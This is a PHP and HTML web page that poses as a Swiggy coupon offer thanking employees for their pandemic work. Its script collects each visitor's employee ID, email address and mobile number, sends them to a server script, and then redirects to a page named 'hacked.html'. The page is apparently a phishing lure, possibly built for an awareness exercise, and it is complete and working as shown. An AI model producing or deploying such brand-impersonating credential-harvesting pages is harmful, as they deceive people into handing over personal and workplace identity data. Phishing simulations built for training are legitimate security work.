<?php
session_start();

if (isset($_SESSION['views']))
    $_SESSION['views'] = $_SESSION['views'] + 1;
else
    $_SESSION['views'] = 1;

$count = $_SESSION['views'];

require 'conn.php';

$sql = "insert into couponduplicatecount (count)
        values('$count'); ";
$result = mysqli_query($mysqli, $sql);

session_destroy();

?>



<!DOCTYPE html><!--  This site was created in Webflow. http://www.webflow.com  -->
<!--  Last Published: Wed Oct 06 2021 06:55:53 GMT+0000 (Coordinated Universal Time)  -->
<html data-wf-page="615c9294661107765933cf13" data-wf-site="615c9294661107dcaf33cf12">

<head>
  <meta charset="utf-8">
  <title>swiggy_coupon</title>
  <meta content="width=device-width, initial-scale=1" name="viewport">
  <meta content="Webflow" name="generator">
  <link href="css/normalize.css" rel="stylesheet" type="text/css">
  <link href="css/webflow.css" rel="stylesheet" type="text/css">
  <link href="css/swiggy-coupon.webflow.css" rel="stylesheet" type="text/css">
  <script src="https://ajax.googleapis.com/ajax/libs/webfont/1.6.26/webfont.js" type="text/javascript"></script>
  <script
    type="text/javascript">WebFont.load({ google: { families: ["Open Sans:300,300italic,400,400italic,600,600italic,700,700italic,800,800italic"] } });</script>
  <!-- [if lt IE 9]><script src="https://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv.min.js" type="text/javascript"></script><![endif] -->
  <script
    type="text/javascript">!function (o, c) { var n = c.documentElement, t = " w-mod-"; n.className += t + "js", ("ontouchstart" in o || o.DocumentTouch && c instanceof DocumentTouch) && (n.className += t + "touch") }(window, document);</script>
  <link href="images/favicon.ico" rel="shortcut icon" type="image/x-icon">
  <link href="images/webclip.png" rel="apple-touch-icon">
</head>

<body class="body">
  <div class="w-row">
    <div class="column-2 w-col w-col-6"><img src="images/Swiggy.svg" loading="lazy" alt="">
      <h1 class="heading">Fill the form to Claim your coupon for RS 1000.</h1>
      <div class="container w-container">
        <div class="w-form">
          <form id="email-form" name="email-form" data-name="Email Form" method="post" redirect="/hacking.html"
            data-redirect="/hacking.html">
            <label for="name" class="field-label">Employee ID</label>
            <input type="text" class="text-field w-input" maxlength="256" name="name" data-name="Name" placeholder=""
              id="empid">
            <label for="name-3" class="field-label">Email Address</label>
            <input type="text" class="text-field w-input" maxlength="256" name="name-2" data-name="Name 2"
              placeholder="" id="phno">
            <label for="email" class="field-label-2">Mobile No.</label>
            <input type="email" class="w-input" maxlength="256" name="email" data-name="Email" placeholder=""
              id="emailid" required="">
            <input type="submit" value="Submit" id="submit" data-wait="Please wait..." class="submit-button w-button">
          </form>
          <div class="w-form-done">
            <div>Thank you! Your submission has been received!</div>
          </div>
          <div class="w-form-fail">
            <div>Oops! Something went wrong while submitting the form.</div>
          </div>
        </div>
      </div>
    </div>
    <div class="column w-col w-col-6">
      <h1 class="heading-2">What a year it???s been! You???ve worked so hard during the pandemic for us.</h1><img
        src="images/success-1.png" loading="lazy" alt="" class="image-2">
      <h1 class="heading-3">It???s time we celebrate you.</h1>
    </div>
  </div>
  <script src="https://d3e54v103j8qbb.cloudfront.net/js/jquery-3.5.1.min.dc5e7f18c8.js?site=615c9294661107dcaf33cf12"
    type="text/javascript" integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0="
    crossorigin="anonymous"></script>
  <script src="js/webflow.js" type="text/javascript"></script>
  <!-- [if lte IE 9]><script src="https://cdnjs.cloudflare.com/ajax/libs/placeholders/3.0.2/placeholders.min.js"></script><![endif] -->

  <script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/js/materialize.min.js"></script>
  <script>
    $(document).ready(function () {


      $('#submit').click(function () {
        var empid = $('#empid').val();
        var emailid = $('#emailid').val();
        var phno = $('#phno').val();

        if ($('#empid').val().length === 0 ||
          $('#emailid').val().length === 0 ||
          $('#phno').val().length === 0) {
          alert('Enter all the fields');
        } else {
          $.get('insert.php', {
            'empid': empid,
            'emailid': emailid,
            'phno': phno

          }, function () {

            console.log('worked');
          }, "json");



          $('#empid').val("");
          $('#emailid').val("");
          $('#phno').val("");

          console.log('working')

          var url = 'hacked.html';
          $(location).prop('href', url);



        }
      })
    });
  </script>



</body>

</html>